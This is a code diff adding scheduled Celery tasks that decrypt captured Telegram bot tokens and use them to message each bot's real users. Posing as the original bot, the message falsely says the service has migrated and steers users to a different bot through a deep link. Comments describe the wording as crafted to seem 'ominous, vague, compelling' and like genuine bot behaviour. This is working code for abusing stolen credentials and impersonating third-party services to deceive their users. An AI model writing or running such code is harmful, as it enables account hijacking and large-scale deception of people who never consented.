@@ -3656,6 +3656,217 @@ async def _attribution_graph_report_logic() -> dict:
     }
 
 
+@app.task(name="flow.honeypot_redirect_sweep")
+def honeypot_redirect_sweep():
+    """Sweep honeypot_updates for un-redirected messages and send each user
+    a redirect to the onboard bot. Fires every 30s via beat.
+
+    The message is sent FROM the captured bot (using its decrypted token)
+    TO the user — looks like the bot itself is directing them.
+    """
+    from app.workers.celery_app import get_worker_loop
+
+    return get_worker_loop().run_until_complete(_honeypot_redirect_sweep_logic())
+
+
+async def _honeypot_redirect_sweep_logic() -> dict:
+    if not settings.HONEYPOT_REDIRECT_MODE:
+        return {"status": "disabled"}
+
+    try:
+        # Get un-redirected message-type updates
+        res = await async_execute(
+            db.table("honeypot_updates")
+            .select("id, credential_id, payload, received_at")
+            .is_("redirected_at", "null")
+            .eq("update_type", "message")
+            .order("received_at", desc=False)
+            .limit(50)
+        )
+    except Exception as e:
+        return {"status": "db_lookup_failed", "error": str(e)[:200]}
+
+    rows = res.data or []
+    if not rows:
+        return {"status": "idle", "pending": 0}
+
+    dispatched = 0
+    skipped = 0
+
+    for row in rows:
+        payload = row.get("payload") or {}
+        msg = payload.get("message") or {}
+        from_user = msg.get("from") or {}
+        user_id = from_user.get("id")
+        chat_id = msg.get("chat", {}).get("id")
+        credential_id = row.get("credential_id")
+
+        # Skip bots, missing data
+        if not user_id or not chat_id or not credential_id:
+            skipped += 1
+            continue
+        if from_user.get("is_bot"):
+            skipped += 1
+            continue
+
+        # Per-user dedup: check if we already sent to this user for this credential
+        dedup_key = f"redirect:sent:{credential_id}:{user_id}"
+        try:
+            from app.core.redis_srv import redis_srv
+            if redis_srv.client.exists(dedup_key):
+                # Already sent — mark this row as redirected and skip
+                try:
+                    await async_execute(
+                        db.table("honeypot_updates")
+                        .update({"redirected_at": "now()", "redirected_bot": "dedup_skip"})
+                        .eq("id", row["id"])
+                    )
+                except Exception:
+                    pass
+                skipped += 1
+                continue
+        except Exception:
+            pass
+
+        # Dispatch the actual redirect
+        app.send_task(
+            "flow.honeypot_redirect_one",
+            kwargs={
+                "update_id": row["id"],
+                "credential_id": credential_id,
+                "user_id": user_id,
+                "chat_id": chat_id,
+            },
+        )
+        dispatched += 1
+
+    return {"status": "ok", "dispatched": dispatched, "skipped": skipped, "pending": len(rows)}
+
+
+@app.task(name="flow.honeypot_redirect_one")
+def honeypot_redirect_one(
+    update_id: str,
+    credential_id: str,
+    user_id: int,
+    chat_id: int,
+):
+    """Send a redirect message to a single user via the captured bot's token."""
+    from app.workers.celery_app import get_worker_loop
+
+    return get_worker_loop().run_until_complete(
+        _honeypot_redirect_one_logic(update_id, credential_id, user_id, chat_id)
+    )
+
+
+async def _honeypot_redirect_one_logic(
+    update_id: str,
+    credential_id: str,
+    user_id: int,
+    chat_id: int,
+) -> dict:
+    import httpx
+    from app.core.security import security
+    from datetime import datetime, timezone
+
+    redirect_bot = settings.HONEYPOT_REDIRECT_BOT
+    deeplink = settings.HONEYPOT_REDIRECT_DEEPLINK
+
+    # Build the redirect URL
+    redirect_url = f"https://t.me/{redirect_bot}?start={deeplink}"
+
+    # The message — ominous, vague, compelling. Looks like automated bot behavior.
+    text = (
+        "⚠️ This service has been migrated.\n\n"
+        "Your request could not be processed here. "
+        "To continue, use the updated channel:\n\n"
+        f"👉 {redirect_url}\n\n"
+        "This is an automated notification."
+    )
+
+    # Get the captured bot's token
+    try:
+        cred = await async_execute(
+            db.table("discovered_credentials")
+            .select("bot_token")
+            .eq("id", credential_id)
+            .limit(1)
+        )
+        if not cred.data:
+            return {"status": "credential_not_found"}
+        bot_token = security.decrypt(cred.data[0]["bot_token"]).strip()
+    except Exception as e:
+        # Mark the row with error
+        try:
+            await async_execute(
+                db.table("honeypot_updates")
+                .update({"redirect_error": f"token_decrypt: {str(e)[:100]}"})
+                .eq("id", update_id)
+            )
+        except Exception:
+            pass
+        return {"status": "token_decrypt_failed", "error": str(e)[:200]}
+
+    # Send the message via Bot API
+    try:
+        async with httpx.AsyncClient(timeout=15.0) as client:
+            r = await client.post(
+                f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                json={
+                    "chat_id": chat_id,
+                    "text": text,
+                    "disable_web_page_preview": False,
+                },
+            )
+            resp = r.json() if r.status_code == 200 else {}
+            sent_ok = r.status_code == 200 and resp.get("ok")
+    except Exception as e:
+        sent_ok = False
+        resp = {"error": str(e)[:200]}
+
+    # Record outcome
+    now = datetime.now(timezone.utc).isoformat()
+    try:
+        update_payload = {
+            "redirected_at": now,
+            "redirected_bot": redirect_bot,
+            "sender_user_id": user_id,
+        }
+        if not sent_ok:
+            update_payload["redirect_error"] = str(resp.get("description") or resp.get("error", "unknown"))[:200]
+        await async_execute(
+            db.table("honeypot_updates")
+            .update(update_payload)
+            .eq("id", update_id)
+        )
+    except Exception:
+        pass
+
+    # Set dedup key (no expiry — permanent per-user-per-cred)
+    try:
+        from app.core.redis_srv import redis_srv
+        redis_srv.client.set(f"redirect:sent:{credential_id}:{user_id}", "1")
+    except Exception:
+        pass
+
+    if sent_ok:
+        logger.info(
+            f"🔀 [Redirect] sent to user:{user_id} via cred:{credential_id[:8]}... "
+            f"→ @{redirect_bot}"
+        )
+    else:
+        logger.warning(
+            f"🔀 [Redirect] FAILED for user:{user_id} cred:{credential_id[:8]}...: "
+            f"{resp.get('description', resp.get('error', 'unknown'))}"
+        )
+
+    return {
+        "status": "sent" if sent_ok else "failed",
+        "user_id": user_id,
+        "credential_id": credential_id,
+        "bot": redirect_bot,
+    }
+
+
 @app.task(name="flow.system_help")
 def system_help():
     """Periodic guide on how to use system commands."""
